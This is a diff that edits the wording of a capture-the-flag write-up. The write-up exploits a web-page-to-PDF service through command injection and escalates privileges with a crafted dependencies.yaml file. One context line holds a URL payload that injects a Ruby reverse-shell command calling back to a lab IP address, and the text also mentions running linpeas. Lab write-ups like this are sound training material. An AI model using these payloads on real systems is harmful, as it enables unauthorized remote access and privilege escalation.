@@ -40,7 +40,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds
 
 ![](./images/1.png)
 
-- It's service that converts Web Pages to PDF
+- It's a service that converts Web Pages to PDF
   - Let's supply anything and see what it returns
   - I am running Burp Suite in the background
 - So after supplying any url, we receive a pdf
@@ -49,18 +49,17 @@ Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds
 
 ![](./images/2.png)
 
-- We see the package and version
-  - After a little bit of googling, I got
+- We see the package and it's version
+  - After a little bit of googling
 
 ![](./images/3.png)
 
-- We have an RCE 
-  - Let's test it
+- Let's test it
 
 ![](./images/4.png)
 
-- I set up tcpdump to listen to ICMP
-  - And we get a response
+- I set up ```tcpdump``` to listen to ICMP
+  - Success
 
 ![](./images/5.png)
 
@@ -75,12 +74,12 @@ http://10.10.16.37:8000/index.html?p=#{'%20`ruby -rsocket -e'spawn("sh",[:in,:ou
 ```
 
 - Try the payload
-  - and We get a reverse shell
+  - And We get a reverse shell
 
 ![](./images/7.png)
 
 - Now we need to privesc
-  - After running a [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+  - After running the [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
   - We see that we have another user
 ```
 ╔══════════╣ Users with console
@@ -103,7 +102,7 @@ ruby:x:1001:1001::/home/ruby:/bin/bash
 ![](./images/9.png)
 
 - Let's check the file
-  - According to comments it loads the list of dependencies in the ```dependencies.yaml``` and compares to the ones installed
+  - According to the comments, the script loads the list of dependencies from the ```dependencies.yaml``` and compares them to the ones already installed
   
 ![](./images/10.png)
 
@@ -118,8 +117,8 @@ ruby:x:1001:1001::/home/ruby:/bin/bash
 ![](./images/12.png)
 
 - So let's try
-  - Firstly, it seems like the script searches for ```dependencies.yaml``` from where we execute the script
-  - So we can create ```dependencies.yaml``` anywhere where we have privileges
+  - Firstly, it seems like the script searches for ```dependencies.yaml``` file in the directory where we execute the command
+  - So we can create ```dependencies.yaml``` anywhere where we have the privileges to do so
   - Copy the payload from the links above
 
 ![](./images/13.png)
